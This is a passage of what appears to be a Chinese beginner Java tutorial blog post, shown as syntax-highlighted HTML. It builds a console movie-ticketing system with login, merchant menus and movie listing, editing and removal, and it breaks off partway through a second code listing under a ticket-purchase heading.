class="string">&quot;天天电影院&quot;</span>);</span><br><span class="line">        b.setAddress(<span class="string">&quot;旗山大道56号&quot;</span>);</span><br><span class="line">        ALL_USERS.add(b);</span><br><span class="line">        <span class="comment">//必须将商家信息添加到排片信息中</span></span><br><span class="line">        List&lt;Movie&gt; movies = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ALL_MOVIES.put(b,movies);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 4.一个通用的scanner</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Scanner</span> <span class="variable">SYS_SC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *5.用一个静态的用户对象记录当前成功登录的用户对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User loginUser;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *6.定义一个标准的时间格式</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy/MM/dd HH/mm/ss&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *7.定义一个日志对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(<span class="string">&quot;MovieSystem..class&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        showMain();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============黑马电影================&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.登录&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.用户注册&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;3.商家注册&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;根据输入数字选择&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;1&quot;</span>):</span><br><span class="line">                    <span class="comment">//登录</span></span><br><span class="line">                    login();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;2&quot;</span>):</span><br><span class="line">                    <span class="comment">//用户注册</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;3&quot;</span>):</span><br><span class="line">                    <span class="comment">//商家注册</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入不规范，请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入您的昵称&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">loginName</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入您的密码&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//1.根据登录名称得查询对象</span></span><br><span class="line">            <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span>CheckLoginName(loginName);</span><br><span class="line">            <span class="comment">//2.判断对象是否存在</span></span><br><span class="line">            <span class="keyword">if</span> (u != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">//3.判断密码是否正确</span></span><br><span class="line">                <span class="keyword">if</span>(u.getPassWord().equals(password))&#123;</span><br><span class="line">                    <span class="comment">//密码正确~~</span></span><br><span class="line">                    <span class="comment">//判断登录类型</span></span><br><span class="line">                    loginUser =u;</span><br><span class="line">                    LOGGER.info(u.getUserName()+<span class="string">&quot;登录了系统&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (u <span class="keyword">instanceof</span> Customer)&#123;</span><br><span class="line">                        showCustomerMain();</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        showBusinessMain();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//在正常登录情况下用户在此退出</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;密码错误请重新输入&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;用户名错误请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商家操作界面</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showBusinessMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============黑马电影商家================&quot;</span>);</span><br><span class="line">            System.out.println(loginUser.getUserName()+ (loginUser.getSex()==<span class="string">&#x27;男&#x27;</span>? <span class="string">&quot;先生&quot;</span>:<span class="string">&quot;女士&quot;</span>)+<span class="string">&quot;欢迎您登录系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.展示详情&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.上架电影&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;3.下架电影&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;4.修改电影&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;5.退出&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请您根据数字做出操作&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;1&quot;</span>):</span><br><span class="line">                    <span class="comment">//展示详情</span></span><br><span class="line">                    showBusinessINFO();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;2&quot;</span>):</span><br><span class="line">                    <span class="comment">//上架</span></span><br><span class="line">                    addMovie();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;3&quot;</span>):</span><br><span class="line">                    <span class="comment">//下架</span></span><br><span class="line">                    deleteMovie();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;4&quot;</span>):</span><br><span class="line">                    <span class="comment">//修改</span></span><br><span class="line">                    updateMovie();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;5&quot;</span>):</span><br><span class="line">                    <span class="comment">//退出</span></span><br><span class="line">                    System.out.println(loginUser.getLoginName()+<span class="string">&quot;欢迎您下次到来&quot;</span>);</span><br><span class="line">                    LOGGER.info(loginUser.getUserName()+<span class="string">&quot;退出了&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入有误请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 修改影片信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">updateMovie</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============修改电影================&quot;</span>);</span><br><span class="line">        <span class="type">Business</span> <span class="variable">business</span> <span class="operator">=</span> (Business) loginUser;</span><br><span class="line">        List&lt;Movie&gt; movies =ALL_MOVIES.get(business);</span><br><span class="line">        <span class="comment">//判断当前电影数量是否为空</span></span><br><span class="line">        <span class="keyword">if</span>(movies.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;数量为空无法下架&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//让商家根据名字选择要修改的电影</span></span><br><span class="line">        System.out.println(<span class="string">&quot;选择您要修改的电影&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">movieName</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        <span class="type">Movie</span> <span class="variable">movie</span> <span class="operator">=</span>checkMovie(movieName);</span><br><span class="line">        <span class="keyword">if</span> (movie!=<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后的片名：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后主演：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">actor</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后时长：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">time</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后票价：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">price</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入修改后票数：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">totalNumber</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;请您输入修改后的放映时间&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span>SYS_SC.nextLine();</span><br><span class="line">                    movie.setName(name);</span><br><span class="line">                    movie.setActor(actor);</span><br><span class="line">                    movie.setPrice(Double.valueOf(price));</span><br><span class="line">                    movie.setTime(Double.valueOf(time));</span><br><span class="line">                    movie.setNumber(Integer.valueOf(totalNumber));</span><br><span class="line">                    movie.setStartTime(sdf.parse(start));</span><br><span class="line">                    System.out.println(<span class="string">&quot;恭喜您成功修改了电影&quot;</span>);</span><br><span class="line">                    showBusinessINFO();</span><br><span class="line">                    LOGGER.info(loginUser.getUserName()+<span class="string">&quot;修改了《&quot;</span>+movie.getName()+<span class="string">&quot;》&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    LOGGER.error(<span class="string">&quot;时间解析错误&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该影片不存在&quot;</span>);</span><br><span class="line">            LOGGER.info(loginUser.getUserName()+<span class="string">&quot;修改影片失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 下架影片</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteMovie</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============下架电影================&quot;</span>);</span><br><span class="line">        <span class="type">Business</span> <span class="variable">business</span> <span class="operator">=</span> (Business) loginUser;</span><br><span class="line">        List&lt;Movie&gt; movies =ALL_MOVIES.get(business);</span><br><span class="line">        <span class="comment">//判断当前电影数量是否为空</span></span><br><span class="line">        <span class="keyword">if</span>(movies.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;数量为空无法下架&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//让商家根据名字选择要下架的电影</span></span><br><span class="line">        System.out.println(<span class="string">&quot;选择您要下架的电影&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">movieName</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断是否存在该电影</span></span><br><span class="line">        <span class="type">Movie</span> <span class="variable">movie</span> <span class="operator">=</span>checkMovie(movieName);</span><br><span class="line">        <span class="keyword">if</span> (movie != <span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;您成功删除&quot;</span>+movie.getName()+<span class="string">&quot;的信息&quot;</span>);</span><br><span class="line">            LOGGER.info(loginUser.getUserName()+<span class="string">&quot;删除了《&quot;</span>+movie.getName()+<span class="string">&quot;》的信息&quot;</span>);</span><br><span class="line">            movies.remove(movie);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;删除失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *检查影片是否存在</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Movie <span class="title function_">checkMovie</span><span class="params">(String movieName)</span>&#123;</span><br><span class="line">        <span class="type">Business</span> <span class="variable">business</span> <span class="operator">=</span> (Business) loginUser;</span><br><span class="line">        List&lt;Movie&gt; movies =ALL_MOVIES.get(business);</span><br><span class="line">        <span class="keyword">for</span> (Movie movie : movies) &#123;</span><br><span class="line">            <span class="keyword">if</span> (movie.getName().contains(movieName))&#123;</span><br><span class="line">                <span class="keyword">return</span> movie;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商家上架电影</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addMovie</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============上架电影================&quot;</span>);</span><br><span class="line">        <span class="comment">// 根据商家对象（已经登录的用户loginUser）作为Map集合的键，其对于的值就是影片的详细信息 Map&lt;Business, List&lt;Movie&gt;&gt; ALL_MOVIES</span></span><br><span class="line">        List&lt;Movie&gt; movies = ALL_MOVIES.get(loginUser);</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入新片名：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入主演：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">actor</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入时长：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">time</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入票价：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">price</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请您输入票数：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">totalNumber</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请您输入影片放映时间：&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">start</span>  <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="comment">//sdf.parse 可能会出现异常所以要抛出异常</span></span><br><span class="line">                <span class="type">Movie</span> <span class="variable">movie</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Movie</span>(name,actor,Double.valueOf(price),Integer.valueOf(totalNumber),</span><br><span class="line">                        Double.valueOf(time),sdf.parse(start));</span><br><span class="line">                movies.add(movie);</span><br><span class="line">                System.out.println(<span class="string">&quot;您成功上架了：《&quot;</span>+movie.getName()+<span class="string">&quot;》~~&quot;</span>);</span><br><span class="line">                LOGGER.info(loginUser.getUserName()+<span class="string">&quot;上架了&quot;</span>+movie.getName());</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                LOGGER.error(<span class="string">&quot;时间解析错误&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 显示商家详细信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showBusinessINFO</span><span class="params">()</span> &#123;</span><br><span class="line">        LOGGER.info(loginUser.getUserName()+<span class="string">&quot;查看了全部电影信息&quot;</span>);</span><br><span class="line">        <span class="comment">//父类转换为子类</span></span><br><span class="line">        <span class="type">Business</span> <span class="variable">business</span> <span class="operator">=</span> (Business) loginUser;</span><br><span class="line">        System.out.println(<span class="string">&quot;店铺名称：\t\t&quot;</span>+business.getShopName()+</span><br><span class="line">                <span class="string">&quot;联系电话: \t\t&quot;</span>+business.getPhone()+<span class="string">&quot;地址：\t\t&quot;</span>+business.getAddress());</span><br><span class="line">        <span class="comment">// 根据商家对象（已经登录的用户loginUser）作为Map集合的键，其对于的值就是影片的详细信息 Map&lt;Business, List&lt;Movie&gt;&gt; ALL_MOVIES</span></span><br><span class="line">        List&lt;Movie&gt; movies = ALL_MOVIES.get(loginUser);</span><br><span class="line">        <span class="keyword">if</span> (movies.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;片面\t\t\t主演\t\t时长\t\t评分\t\t票价\t\t余票\t\t放映时间\t\t&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (Movie movie : movies) &#123;</span><br><span class="line">                System.out.println(movie.getName()+<span class="string">&quot;\t\t\t&quot;</span>+movie.getActor()+<span class="string">&quot;\t\t&quot;</span>+movie.getTime()+<span class="string">&quot;\t\t&quot;</span>+movie.getScore()</span><br><span class="line">                +<span class="string">&quot;\t\t&quot;</span>+movie.getPrice()+<span class="string">&quot;\t\t&quot;</span>+movie.getNumber()+<span class="string">&quot;\t\t&quot;</span>+sdf.format(movie.getStartTime()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;当前影片为空&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户操作界面</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showCustomerMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============黑马电影用户================&quot;</span>);</span><br><span class="line">            System.out.println(loginUser.getUserName()+ (loginUser.getSex()==<span class="string">&#x27;男&#x27;</span>? <span class="string">&quot;先生&quot;</span>:<span class="string">&quot;女士&quot;</span>)+<span class="string">&quot;欢迎您登录系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.展示全部影片信息&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.根据电影名称查询信息&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;3.评分系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;4.购票系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;5.退出系统&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请您根据数字做出选择&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> SYS_SC.nextLine();</span><br><span class="line">            <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;1&quot;</span>):</span><br><span class="line">                    <span class="comment">//展示全部排片信息</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;2&quot;</span>):</span><br><span class="line">                    <span class="comment">//查询</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;3&quot;</span>):</span><br><span class="line">                    <span class="comment">//评分</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;4&quot;</span>):</span><br><span class="line">                    <span class="comment">//购票</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="string">&quot;5&quot;</span>):</span><br><span class="line">                    <span class="comment">//退出</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入有误请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登录校验</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loginName 用户名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  User <span class="title function_">CheckLoginName</span><span class="params">(String loginName)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (User User : ALL_USERS) &#123;</span><br><span class="line">            <span class="comment">//通过遍历判断是否存在这个用户名</span></span><br><span class="line">            <span class="keyword">if</span>(User.getLoginName().equals(loginName))&#123;</span><br><span class="line">                <span class="keyword">return</span> User;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="购票功能"><a href="#购票功能" class="headerlink" title="购票功能"></a>购票功能</h3><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206062213378.png" alt="image-20220606221336303"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.Business;</span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.Customer;</span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.Movie;</span><br><span class="line"><span class="keyword">import</span> com.itheima.bean.User;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MovieSystem</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 定义系统的数据容器给用户存储</span></span><br><span class="line"><span class="comment">     * 1.封装很多对象（用户对象，商家对象）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;User&gt; ALL_USERS = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 2.存储系统全部的商家和排片信息</span></span><br><span class="line"><span class="comment">     * 商家1 =【p1,p2,p3】</span></span><br><span class="line"><span class="comment">     * 商家2 =【p1,p2,p3】</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Business,List&lt;Movie&gt;&gt; ALL_MOVIES = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 3.准备一些测试用户信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>();</span><br><span class="line">        c.setLoginName(<span class="string">&quot;古娜娜黑暗之神&quot;</span>);</span><br><span class="line">        c.setUserName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        c.setPassWord(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        c.setSex(<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">        c.setMoney(<span class="number">365.45</span>);</span><br><span class="line">        c.setPhone(<span class="string">&quot;18859971666&quot;</span>);</span><br><span class="line">        ALL_USERS.add(c);</span><br><span class="line"></span><br><span class="line">        <span class="type">Business</span> <span class="variable">b</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Business</span>();</span><br><span class="line">        b.setLoginName(<span class="string">&quot;小关铺子&quot;</span>);</span><br><span class="line">        b.setUserName(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        b.setPassWord(<span class="string">&quot;admin123&quot;</span>);</span><br><span class="line">        b.setSex(<span class="string">&#x27;女&#x27;</span>);</span><br><span class="line">        b.setPhone(<span class="string">&quot;0591-13456789&quot;</span>);</span><br><span class="line">        b.setMoney(<span class="number">1110.58</span>);</span><br><span class="line">        b.setShopName(<span class="string">&quot;天天电影院&quot;</span>);</span><br><span class="line">        b.setAddress(<span class="string">&quot;旗山大道56号&quot;</span>);</span><br><span class="line">        ALL_USERS.add(b);</span><br><span class="line">        <span class="comment">//必须将商家信息添加到排片信息中</span></span><br><span class="line">        List&lt;Movie&gt; movies = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ALL_MOVIES.put(b,movies);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 4.一个通用的scanner</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Scanner</span> <span class="variable">SYS_SC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *5.用一个静态的用户对象记录当前成功登录的用户对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User loginUser;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *6.定义一个标准的时间格式</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy/MM/dd 